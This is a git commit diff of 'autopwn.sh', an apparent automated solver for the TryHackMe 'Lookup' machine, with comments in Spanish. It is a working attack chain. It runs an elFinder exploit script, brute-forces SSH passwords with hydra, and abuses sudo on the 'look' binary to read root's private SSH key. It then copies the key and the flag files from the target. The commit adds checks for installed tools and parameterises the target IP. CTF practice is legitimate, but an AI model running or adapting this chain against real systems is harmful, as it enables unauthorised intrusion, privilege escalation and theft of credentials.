5a4e630c00e7779da4f9f134b699ca0990eb8efd
shosdoo <108087046+shosdoo@users.noreply.github.com>
2024-11-27 13:33:09 -0600

    Cambio de verificaciones
    Se agregaron verificaciones a las herramientas instaladas

--- autopwn.sh
+++ autopwn.sh
@@ -1,10 +1,94 @@
 #!/bin/bash
 
+
+
 dominio="lookup.thm"
 subdominio="files.lookup.thm"
+etchosts="/tmp/hostsbak"
+
+echo -e "[+] Verificando herramientas instaladas...\n"
+sleep 2
+
+python2=$(which python2)
+exit_py2=$?
+
+hydr=$(which hydra)
+exit_hy=$?
+
+sssh=$(which ssh)
+exit_ssh=$?
+
+wfuz=$(which wfuzz)
+exit_wfuz=$?
+
+wgt=$(which wget)
+exit_wget=$?
+
+sshpas=$(which sshpass)
+exit_sshpass=$?
+
+sscp=$(which scp)
+exit_scp=$?
+
+if [ "$exit_scp" = 0 ];then
+        echo "[+] Python2 instalado $sscp"
+
+else
+        echo "scp no encontrado."
+fi
+
+
+if [ "$exit_sshpass" = 0 ];then
+        echo "[+] sshpass instalado $sshpas"
+
+else
+        echo "sshpass no encontrado."
+fi
+
+
+if [ "$exit_wget" = 0 ];then
+        echo "[+] wget instalado $wgt"
+
+else
+        echo "wget no encontrado."
+fi
+
+
+if [ "$exit_py2" = 0 ];then
+	echo "[+] Python2 instalado $python2"
+
+else
+	echo "Python2 no encontrado."
+fi
+
+
+if [ "$exit_hy" = 0 ];then
+        echo "[+] Hydra instalado $hydr"
+
+else
+        echo "Hydra no encontrado."
+fi
+
+
+if [ "$exit_ssh" = 0 ];then
+        echo "[+] ssh instalado $sssh"
+
+else
+        echo "ssh no encontrado."
+fi
+
+
+if [ "$exit_wfuz" = 0 ];then
+        echo "[+] wfuzz instalado $wfuz"
+
+else
+        echo "wfuzz no encontrado."
+fi
+
 
 read -p "Ingresa la ip: " ip
 
+cp /etc/hosts "$etchosts"
 
 echo "$ip $dominio $subdominio" >> /etc/hosts
 
@@ -30,7 +114,7 @@ python2 elfinder.py http://files.lookup.thm/elFinder | tee output.txt
 
 cat output.txt | grep -v "\[.*\]" > passwords.txt
 
-hydra -l think -P passwords.txt ssh://10.10.3.30 -o password.txt > /dev/null 2>&1
+hydra -l think -P passwords.txt ssh://"$ip" -o password.txt > /dev/null 2>&1
 
 passssh=$(cat password.txt | grep -i login| awk '{print $NF}')
 
@@ -38,23 +122,24 @@ echo -e "\n[+] Password de usuario think encontrada: $passssh"
 
 rm passwords.txt && rm password.txt && rm output.txt && rm SecSignal.jpg && rm elfinder.py
 
-echo -e "\n[+] Conectando por ssh..."
+echo -e "\n[+] Conectando por ssh...\n"
 
 lfile="/root/.ssh/id_rsa"
 
-sshpass -p "$passssh" ssh -o StrictHostKeyChecking=no -T think@10.10.3.30 "echo '$passssh' | sudo -S look '' '$lfile' > /tmp/id_rsaroot" > /dev/null 2>&1
+sshpass -p "$passssh" ssh -o StrictHostKeyChecking=no -T think@"$ip" "echo '$passssh' | sudo -S look '' '$lfile' > /tmp/id_rsaroot" > /dev/null 2>&1
 
-sshpass -p "$passssh" scp think@10.10.3.30:/tmp/id_rsaroot .
+sshpass -p "$passssh" scp think@"$ip":/tmp/id_rsaroot .
 
 mv id_rsaroot id_rsa && chmod 600 id_rsa
 
-scp -i id_rsa root@10.10.3.30:/root/root.txt . 1>/dev/null
-scp -i id_rsa root@10.10.3.30:/home/think/user.txt . 1>/dev/null
+scp -i id_rsa root@"$ip":/root/root.txt . 1>/dev/null
+scp -i id_rsa root@"$ip":/home/think/user.txt . 1>/dev/null
 
 cat user.txt | awk '{print "Flag de user: "$0}'
 cat root.txt | awk '{print "Flag de root: " $0}'
 
 dirid=$(pwd)
-echo -e "\n[+]Pwned! id_rsa guardado en: $dirid"
+echo -e "\n[+] Pwned! id_rsa guardado en: $dirid"
 
 rm user.txt && rm root.txt
+mv "$etchosts" /etc/hosts
